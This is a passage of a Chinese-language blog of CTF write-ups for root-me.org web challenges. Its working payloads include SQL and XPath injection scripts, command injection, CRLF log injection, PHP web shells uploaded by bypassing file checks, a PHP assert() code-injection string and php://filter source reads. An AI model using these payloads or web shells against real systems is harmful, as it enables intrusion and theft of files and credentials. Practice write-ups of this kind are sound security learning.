<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username</span>=John<span class="string">' and ('</span><span class="string">'='</span><span class="string">' or '</span><span class="string">'='</span>&amp;password=<span class="string">') and '</span><span class="string">'='</span></span><br></pre></td></tr></table></figure>
<p>题目后端执行的语句可能是</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//users/user[loginID/<span class="keyword">text</span>()=<span class="string">'xyz'</span><span class="keyword">and</span> password/<span class="keyword">text</span>()=<span class="string">'123test'</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//users/user[loginID/<span class="keyword">text</span>()=<span class="string">'John'</span> <span class="keyword">and</span> (<span class="string">''</span>=<span class="string">''</span> <span class="keyword">or</span> <span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> password/<span class="keyword">text</span>()=<span class="string">''</span>) <span class="keyword">and</span> <span class="string">''</span>=<span class="string">''</span>]</span><br></pre></td></tr></table></figure>
<p>我们可以看到password验证被成功闭合为字符串了比较了。</p>
<h2 id="SQL-injection-Error"><a href="#SQL-injection-Error" class="headerlink" title="SQL injection - Error"></a>SQL injection - Error</h2><p>上sqlmap即可</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap<span class="selector-class">.py</span> -u <span class="string">"http://challenge01.root-me.org/web-serveur/ch34/?action=contents&amp;order=asc"</span> -<span class="selector-tag">p</span> <span class="attribute">order</span> --threads=<span class="number">10</span> --dbs</span><br></pre></td></tr></table></figure>
<p>是一个postgresql数据库的相关注入</p>
<h2 id="SQL-injection-blind"><a href="#SQL-injection-blind" class="headerlink" title="SQL injection - blind"></a>SQL injection - blind</h2><p>本题是SQL盲注，很常规，所以直接给脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://challenge01.root-me.org/web-serveur/ch10/"</span></span><br><span class="line">chars = <span class="string">"qwertyuiopasdfghjklzxcvbnm1234567890QWERTYUIOPASDFGHJKLZXCVBNM@%&amp;?"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> chars:</span><br><span class="line">		content = requests.post(url,data=&#123;<span class="string">'username'</span>:<span class="string">"admin' and password glob '&#123;&#125;*'--+"</span>.format(flag + item), <span class="string">'password'</span>:<span class="string">"123"</span>&#125;).text</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"master"</span> <span class="keyword">in</span> content:</span><br><span class="line">			flag += item</span><br><span class="line">			print(flag)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="SQL-injection-file-reading"><a href="#SQL-injection-file-reading" class="headerlink" title="SQL injection - file reading"></a>SQL injection - file reading</h2><p>在members界面的id参数存在数字型注入， 可以得到数据库信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://challenge01.root-me.org/web-serveur/ch31/?action=members&amp;id=1"</span> -p id --threads=10 -D c_webserveur_31 --dump-all</span><br></pre></td></tr></table></figure>
<p><img src="rootme1/10.png" alt="content"></p>
<p>但是这个密码没有用，题目说了需要文件读取，故尝试读取index.php文件</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/challenge01.root-me.org/web</span>-serveur/ch31/?action=members&amp;id=-<span class="number">1</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> <span class="title">load_file</span>(0<span class="title">x2f6368616c6c656e67652f7765622d736572766575722f636833312f696e6465782e706870</span>),2,3,4-- +</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>16进制值的含义为<em>/challenge/web-serveur/ch31/index.php</em></p>
</blockquote>
<p>之后可以看到密码的相关的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($pass == stringxor($key, base64_decode($data[<span class="string">'member_password'</span>])))&#123;</span><br><span class="line">                                <span class="comment">// authentication success</span></span><br><span class="line">                                <span class="keyword">print</span> <span class="string">"&lt;p&gt;Authentication success !!&lt;/p&gt;"</span>;</span><br><span class="line">                                <span class="keyword">if</span> ($user == <span class="string">"admin"</span>)</span><br><span class="line">                                    <span class="keyword">print</span> <span class="string">"&lt;p&gt;Yeah !!! You're admin ! Use this password to complete this challenge.&lt;/p&gt;"</span>;</span><br><span class="line">                                <span class="keyword">else</span> </span><br><span class="line">                                    <span class="keyword">print</span> <span class="string">"&lt;p&gt;But... you're not admin !&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>$key,stringxor在前面的代码中都有，所以我们按照它的逻辑求解一下即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringxor</span><span class="params">($o1, $o2)</span> </span>&#123;</span><br><span class="line">    $res = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($o1);$i++)</span><br><span class="line">        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        </span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line">$key = <span class="string">"c92fcd618967933ac463feb85ba00d5a7ae52842"</span>;</span><br><span class="line">$a = stringxor($key, base64_decode(<span class="string">'VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA=='</span>));</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可得到前文的$pass的值为 <code>77be4fc97f77f5f48308942bb6e32aacabed9cef</code> ，但是$pass的值也是经过处理的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pass = sha1($_POST[<span class="string">'password'</span>]);</span><br></pre></td></tr></table></figure>
<p>找一个可以解sha1密码的网站在线解密一下即可，最后明文密码为 <code>superpassword</code> 。</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[rootme.webserver1]]></title>
      <url>/2018/07/31/rootme/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近发现了一个ctf网站，正好闲来没事，自己又非常的菜，所以还要继续学习。</p>
<a id="more"></a>
<h1 id="Web-Server"><a href="#Web-Server" class="headerlink" title="Web-Server"></a>Web-Server</h1><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>签到题，查看元素即可。</p>
<h2 id="HTTP-Open-redirect"><a href="#HTTP-Open-redirect" class="headerlink" title="HTTP-Open redirect"></a>HTTP-Open redirect</h2><p>查看提示可知，题目要求我们能够重定向网页到另一个网址，可以尝试抓包看一下，发现发起的请求如下</p>
<blockquote>
<p>GET /web-serveur/ch52/?url=<a href="https://facebook.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134" target="_blank" rel="noopener">https://facebook.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134</a> HTTP/1.1</p>
</blockquote>
<p>那么我们可以尝试修改url实现重定向，但是不对，猜测h字段应该也要相应变化，感觉这个h字段像是一段hash值，测试了一下发现前面url的值的MD5<br>的值正好是后面h字段的值，于是此题就解出来了，payload如下(用bp发送比较好)</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http:<span class="comment">//qq.com&amp;h=fb992d62fc0302ccc9da03fe80fb1d42</span></span><br></pre></td></tr></table></figure>
<h2 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h2><p>题目其实不难，我想复杂了，想着要反弹shell，结果没成功，还是我对命令注入理解太少了，没什么很难的点，直接上payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=127.0.0.1;more index.php</span><br></pre></td></tr></table></figure>
<p>也可以用cat命令，然后查看元素即可</p>
<h2 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h2><p>弱口令，用户名和密码均为admin</p>
<h2 id="User-agent"><a href="#User-agent" class="headerlink" title="User-agent"></a>User-agent</h2><p>看标题应该和user-agent字段有关，访问题目可得</p>
<blockquote>
<p>Wrong user-agent: you are not the “admin” browser!</p>
</blockquote>
<p>所以我们直接修改user-agent字段为admin然后即可hack</p>
<h2 id="Backup-file"><a href="#Backup-file" class="headerlink" title="Backup file"></a>Backup file</h2><p>题目存在备份文件泄露漏洞，泄露的文件为 <code>index.php~</code> ，下载之后即可得flag</p>
<h2 id="HTTP-POST"><a href="#HTTP-POST" class="headerlink" title="HTTP - POST"></a>HTTP - POST</h2><p>抓包绕过前端js，修改score值在发包即可</p>
<h2 id="HTTP-directory-indexing"><a href="#HTTP-directory-indexing" class="headerlink" title="HTTP directory indexing"></a>HTTP directory indexing</h2><p>打开题目查看元素， <code>include(&quot;admin/pass.html&quot;)</code> ，打开题目之后却说这是逗我玩的，之后尝试访问admin，可以访问，接着依次访问 <code>backup/admin.txt</code> 即可得到flag</p>
<h2 id="HTTP-Headers"><a href="#HTTP-Headers" class="headerlink" title="HTTP Headers"></a>HTTP Headers</h2><p>应该是修改请求头，抓包看一下发现有个字段 <code>Header-RootMe-Admin: none</code> ，尝试着把它的值改为true，再次发起请求即可得到flag</p>
<h2 id="HTTP-verb-tampering"><a href="#HTTP-verb-tampering" class="headerlink" title="HTTP verb tampering"></a>HTTP verb tampering</h2><p>这个题没有理解题目的意思，标题的中文意思是 <strong>http动作篡改</strong> ，不知道这个题目要什么，查阅资料后才知道这个题目是要求我们改变我们发起请求的方法，猜测题目应该存在某种逻辑错误导致可以用过更换请求方式来实现绕过，本来可以用curl命令来发起请求，但是我试了没有成功，所以我写了个简单的代码实现它</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://challenge01.root-me.org/web-serveur/ch8/'</span></span><br><span class="line">content = requests.put(url).content</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
<h2 id="Install-files"><a href="#Install-files" class="headerlink" title="Install files"></a>Install files</h2><p>我并没有理解这道题的意义在哪，题目提示 <code>you know phpbb</code> ，又提到install file，直接google一下 <code>phpbb install file</code> 即可得到phpbb系统的安装包位置，访问即可获得flag</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch6<span class="regexp">/phpbb/i</span>nstall<span class="regexp">/install.php</span></span><br></pre></td></tr></table></figure>
<h2 id="Improper-redirect"><a href="#Improper-redirect" class="headerlink" title="Improper redirect"></a>Improper redirect</h2><p>直接抓包修改login.php为index.php即可</p>
<p><img src="rootme/1.png" alt=""></p>
<h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><hr>
<p>首先了解一波CRLF</p>
<blockquote>
<p>CRLF是“回车+换行”（\\r\\n）的简称，在HTTP协议中，，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。HRS是比XSS危害更大的安全问题。</p>
</blockquote>
<p>我的理解就是该种攻击方式能够在HTTP头部注入HTML代码，从而达到html代码注入的目的</p>
<p><em>0X01</em></p>
<p>对于HRS最简单的利用方式是注入两个\r\n，之后在写入XSS代码，来构造一个xss</p>
<p>比如某个网站接受的参数为 <a href="http://test.sina.com.cn/?url=xxx" target="_blank" rel="noopener">http://test.sina.com.cn/?url=xxx</a> ，xxx放在Location后面作为一个跳转。如果我们输出的是</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">url</span>=%0d%0a%0d%0a&lt;img <span class="attribute">src</span>=1 <span class="attribute">onerror</span>=alert(/xxx/)&gt;</span><br></pre></td></tr></table></figure>
<p>那么返回的包就会是</p>
<blockquote>
<p>HTTP/1.1 302 Moved Temporarily<br>Date: Fri, 27 Jun 2014 17:52:17 GMT<br>Content-Type: text/html<br>Content-Length: 154<br>Connection: close<br>Location:<br>&lt;img src=1 onerror=alert(/xxx/)&gt;</p>
</blockquote>
<p>所以就实现了xxs的构造</p>
<p>HRS输入是无视浏览器Filter的，浏览器Filter是一些浏览器应对XSS的保护策略，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter，所以我们可以考虑通过HRS将 <code>X-XSS-Protection:0</code> 注入到HTTP头部中，在利用两个CRLF注入xss代码从而可以实现xss漏洞</p>
<p><a href="https://blog.csdn.net/think_ycx/article/details/50267801" target="_blank" rel="noopener">参考链接</a></p>
<hr>
<p>题目给出了提示</p>
<blockquote>
<p>Inject false data in the journalisation log.</p>
</blockquote>
<p>但是我并不知道究竟怎么样才算是一个false data，不知道这个题目用CRLF怎么来玩，看了别人的wp思路后，可以构造出payload</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /web-serveur/ch14/?<span class="attribute">username</span>=guest authenticated.%0d%0aguest&amp;<span class="attribute">password</span>=12456 HTTP/1.1</span><br></pre></td></tr></table></figure>
<p>刚开始我不懂为什么这样做的原因，但是我看到提交一次请求，日志中更新了两条信息</p>
<blockquote>
<p>guest authenticated.<br>guest failed to authenticate.</p>
</blockquote>
<p>是不是因为一次更新了两条信息从而满足了false data的条件呢？我尝试了其他payload，例如</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /web-serveur/ch14/?<span class="attribute">username</span>=admin authenticated.%0d%0Aadmin&amp;<span class="attribute">password</span>=12456 HTTP/1.1</span><br></pre></td></tr></table></figure>
<p>也是可以的，但是当第一条记录是失败记录时则无法得到flag。总之这题的原理还是不很清楚。</p>
<h2 id="File-upload-double-extensions"><a href="#File-upload-double-extensions" class="headerlink" title="File upload - double extensions"></a>File upload - double extensions</h2><p>文件上传。题目要求读根目录下的.passwd文件，题目给出了提示 <code>double extensions（双后缀）</code> ，基本可以知道这个上传是双后缀名绕过，本地写一个PHP文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$content = shell_exec($_GET[<span class="string">'snow'</span>]);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>保存，修改后缀名为 <code>.php.jpg</code> 然后上传即可获得文件路径，发起如下GET请求</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch20<span class="regexp">/galerie/u</span>pload<span class="regexp">/lngij69s7er2fa7oupcg6nold6/</span><span class="number">1</span>.php.jpg?snow=ls ..<span class="regexp">/../</span>..<span class="regexp">/ -a</span></span><br></pre></td></tr></table></figure>
<p>依次向父目录跳转，直到看到.passwd文件，读文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch20<span class="regexp">/galerie/u</span>pload<span class="regexp">/lngij69s7er2fa7oupcg6nold6/</span><span class="number">1</span>.php.jpg?snow=cat ..<span class="regexp">/../</span>..<span class="regexp">/.passwd</span></span><br></pre></td></tr></table></figure>
<h2 id="File-upload-MIME-type"><a href="#File-upload-MIME-type" class="headerlink" title="File upload - MIME type"></a>File upload - MIME type</h2><p>看题目提示直接修改文件类型即可，不需要更改后缀，创建一个PHP文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'snow'</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>提交，抓包修改一下</p>
<p><img src="rootme/2.png" alt=""></p>
<h2 id="HTTP-cookies"><a href="#HTTP-cookies" class="headerlink" title="HTTP cookies"></a>HTTP cookies</h2><p>考察修改cookie的基本知识，修改cookie值为admin即可</p>
<h2 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h2><p>可以尝试随便点一下，看到URL变化了</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//challenge01.root-me<span class="meta">.org</span>/web-serveur/ch15/ch15.php?galerie=devices</span><br></pre></td></tr></table></figure>
<p>猜测 <code>?galerie=devices</code> 中的devices应该是目录名，所以我们可以尝试一下 </p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch15<span class="regexp">/ch15.php?galerie=./</span></span><br></pre></td></tr></table></figure>
<p>看到确实多出来一个区块</p>
<p><img src="rootme/3.png" alt=""></p>
<p>无法直接点击，查看元素</p>
<p><img src="rootme/4.png" alt=""></p>
<p>按照路径访问</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch15<span class="regexp">/ch15.php?galerie=./</span><span class="regexp">/86hwnX2r</span></span><br></pre></td></tr></table></figure>
<p>可以看到有password区块，查看元素可以看到路径</p>
<p><img src="rootme/5.png" alt=""></p>
<p>但是用get请求无法访问，要用路径名访问才可以，最终payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch15<span class="regexp">/galerie/</span><span class="regexp">/86hwnX2r/</span>password.txt</span><br></pre></td></tr></table></figure>
<h2 id="File-upload-null-byte"><a href="#File-upload-null-byte" class="headerlink" title="File upload - null byte"></a>File upload - null byte</h2><p>考察%00截断，新建PHP文件，改后缀名为 <code>filename.php%00.jpg</code> 上传并访问即可获得flag</p>
<h2 id="PHP-assert"><a href="#PHP-assert" class="headerlink" title="PHP assert()"></a>PHP assert()</h2><p>这题涨姿势了，应该考察的是函数闭合的问题，先尝试随便输入一下，没什么反应，尝试输入非法内容诱使报错</p>
<p><img src="rootme/6.png" alt=""></p>
<p>可以推测报错对应代码应该是 <code>assert(strpos(&#39;includes/home.php&#39;, &#39;..&#39;) === false);</code> ，那么我们是否可以尝试向SQL注入一样闭合括号呢？由报错信息可以看到我们可控的输入内容是 <code>home</code> 这个位置，那么我们尝试闭合一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">','</span>..<span class="string">') === false and strpos('</span>s</span><br></pre></td></tr></table></figure>
<p>拼接到上述代码中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(strpos(<span class="string">'includes/a'</span>,<span class="string">'..'</span>) === <span class="keyword">false</span> <span class="keyword">and</span> strpos(<span class="string">'s.php'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
<p>如此代码成功闭合，那么我们只需要构造代码读取 .passwd 文件的内容即可，最终payload</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch47/?page=home<span class="string">','</span>..') === <span class="literal">false</span> <span class="keyword">and</span> $flag=fopen('.passwd<span class="string">','</span>r') <span class="keyword">and</span> print(fread($flag,filesize('.passwd'))) <span class="keyword">and</span> strpos(<span class="symbol">'home</span></span><br></pre></td></tr></table></figure>
<h2 id="PHP-filters"><a href="#PHP-filters" class="headerlink" title="PHP filters"></a>PHP filters</h2><p>考察PHP://filter的应用</p>
<p>尝试读取文件</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch12<span class="regexp">/?inc=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode<span class="regexp">/resource=login.php</span></span><br></pre></td></tr></table></figure>
<p>base64解码得到源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($_POST[<span class="string">"username"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>]) )&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">"username"</span>]==$username &amp;&amp; $_POST[<span class="string">"password"</span>]==$password)&#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"&lt;h2&gt;Welcome back !&lt;/h2&gt;"</span>);</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"To validate the challenge use this password&lt;br/&gt;&lt;br/&gt;"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">print</span>(<span class="string">"&lt;h3&gt;Error : no such user/password&lt;/h2&gt;&lt;br /&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">  Login&amp;nbsp;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span> /&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">  Password&amp;nbsp;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span> /&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">  &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">  &lt;input type=<span class="string">"submit"</span> value=<span class="string">"connect"</span> /&gt;&lt;br/&gt;&lt;br/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>再访问config.php</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>challenge01.root-me.org<span class="regexp">/web-serveur/</span>ch12<span class="regexp">/?inc=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode<span class="regexp">/resource=config.php</span></span><br></pre></td></tr></table></figure>
<p>解码即可得到flag</p>
<h2 id="PHP-register-globals"><a href="#PHP-register-globals" class="headerlink" title="PHP register globals"></a>PHP register globals</h2><p>查看提示</p>
<blockquote>
<p>It seems that the developper often leaves backup files around…</p>
</blockquote>
<p>可能存在备份文件泄露，尝试发现存在 <code>index.php.bak</code> ，访问之后下载文件，代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">($password, $hidden_password)</span></span>&#123;</span><br><span class="line">    $res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($password) &amp;&amp; $password!=<span class="string">""</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( $password == $hidden_password )&#123;</span><br><span class="line">            $res=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">"logged"</span>]=$res;</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($res)</span></span>&#123;</span><br><span class="line">    $aff= <span class="string">'</span></span><br><span class="line"><span class="string">	  &lt;html&gt;</span></span><br><span class="line"><span class="string">	  &lt;head&gt;</span></span><br><span class="line"><span class="string">	  &lt;/head&gt;</span></span><br><span class="line"><span class="string">	  &lt;body&gt;</span></span><br><span class="line"><span class="string">	    &lt;h1&gt;Authentication v 0.05&lt;/h1&gt;</span></span><br><span class="line"><span class="string">	    &lt;form action="" method="POST"&gt;</span></span><br><span class="line"><span class="string">	      Password&amp;nbsp;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	      &lt;input type="password" name="password" /&gt;&lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	      &lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	      &lt;input type="submit" value="connect" /&gt;&lt;br/&gt;&lt;br/&gt;</span></span><br><span class="line"><span class="string">	    &lt;/form&gt;</span></span><br><span class="line"><span class="string">	    &lt;h3&gt;'</span>.htmlentities($res).<span class="string">'&lt;/h3&gt;</span></span><br><span class="line"><span class="string">	  &lt;/body&gt;</span></span><br><span class="line"><span class="string">	  &lt;/html&gt;'</span>;</span><br><span class="line">    <span class="keyword">return</span> $aff;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">isset</span>($_SESSION[<span class="string">"logged"</span>]) )</span><br><span class="line">    $_SESSION[<span class="string">"logged"</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">$aff=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.inc.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"password"</span>]))</span><br><span class="line">    $password = $_POST[<span class="string">"password"</span>];</span><br><span 